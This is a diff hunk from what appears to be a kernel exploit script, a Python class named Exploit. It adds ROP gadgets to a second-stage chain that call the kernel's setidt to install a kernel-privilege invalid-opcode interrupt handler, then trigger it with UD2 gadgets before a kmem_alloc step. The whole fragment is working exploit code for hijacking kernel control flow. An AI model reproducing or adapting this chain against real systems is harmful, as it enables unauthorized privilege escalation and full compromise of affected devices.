@@ -522,6 +522,24 @@ class Exploit():
     def build_second_rop(self):
         rop = bytearray()
 
+        # setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
+        rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
+        rop += p64(IDT_UD)
+        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
+        rop += p64(self.kdlsym(self.offs.ADD_RSP_28_POP_RBP_RET))
+        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
+        rop += p64(SDT_SYSIGT)
+        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
+        rop += p64(SEL_KPL)
+        rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
+        rop += p64(0)
+        rop += p64(0xDEADBEEF)
+        rop += p64(self.kdlsym(self.offs.SETIDT))
+
+        # Trigger UD handler
+        rop += p64(self.kdlsym(self.offs.UD2_MOV_EAX_1_RET))
+        rop += p64(self.kdlsym(self.offs.UD2_MOV_EAX_1_RET))
+
         # kmem_alloc(*kernel_map, PAGE_SIZE)
 
         # RDI = *kernel_map
